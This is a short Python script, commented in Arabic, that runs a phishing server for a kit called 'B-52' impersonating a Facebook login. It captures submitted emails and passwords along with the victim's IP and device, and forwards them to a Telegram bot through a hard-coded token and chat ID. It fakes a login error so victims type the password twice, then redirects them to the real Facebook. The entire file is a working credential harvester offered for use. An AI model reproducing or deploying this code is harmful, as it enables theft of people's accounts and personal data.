from http.server import HTTPServer, SimpleHTTPRequestHandler
import urllib.parse
import requests
import os

# --- إعدادات البوت الخاصة بك ---
# استبدل هذه القيم ببياناتك الحقيقية
BOT_TOKEN = "8397760075:AAGWDrHjTN7Y0lZvEenbetj6CKq7Ve4KdNI"
CHAT_ID = "5070955155"

# قاموس لتتبع عدد المحاولات لكل مستخدم
user_attempts = {}

def send_to_telegram(message):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {'chat_id': CHAT_ID, 'text': message, 'parse_mode': 'Markdown'}
        requests.post(url, data=data)
    except Exception as e:
        print(f"Error sending to Telegram: {e}")

class B52Handler(SimpleHTTPRequestHandler):
    def do_POST(self):
        # 1. قراءة البيانات المرسلة من الصفحة
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = urllib.parse.parse_qs(post_data)
        
        email = params.get('email', ['N/A'])[0]
        password = params.get('pass', ['N/A'])[0]
        
        # 2. جلب بيانات الجهاز المتصل
        user_agent = self.headers.get('User-Agent', 'Unknown Device')
        ip_address = self.headers.get('X-Forwarded-For', self.client_address[0])

        # 3. منطق "المصيدة المزدوجة"
        if email not in user_attempts:
            user_attempts[email] = 1
            status = "🔴 المحاولة الأولى (تم إظهار رسالة خطأ للضحية)"
            redirect_url = "/?error=login_failed"
        else:
            status = "✅ المحاولة الثانية (تم تأكيد كلمة السر)"
            redirect_url = "https://www.facebook.com/login/" # تحويل للفيسبوك الحقيقي

        # 4. تنسيق الرسالة وإرسالها لتليجرام
        msg = (
            f"🎯 **صيد جديد من B-52**\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📊 **الحالة:** {status}\n"
            f"👤 **الحساب:** `{email}`\n"
            f"🔑 **الباسورد:** `{password}`\n"
            f"━━━━━━━━━━━━━━━\n"
            f"📱 **الجهاز:** `{user_agent[:50]}...` \n"
            f"🌐 **الـ IP:** `{ip_address}`"
        )
        
        send_to_telegram(msg)
        
        # 5. توجيه الضحية (Redirect)
        self.send_response(301)
        self.send_header('Location', redirect_url)
        self.end_headers()

    def do_GET(self):
        # لخدمة ملف index.html بشكل صحيح على السيرفر
        return SimpleHTTPRequestHandler.do_GET(self)

# تشغيل السيرفر على بورت 8080 (المناسب لـ Render)
port = int(os.environ.get("PORT", 8080))
print(f"B-52 Global Radar is Online on port {port}...")
HTTPServer(('0.0.0.0', port), B52Handler).serve_forever()
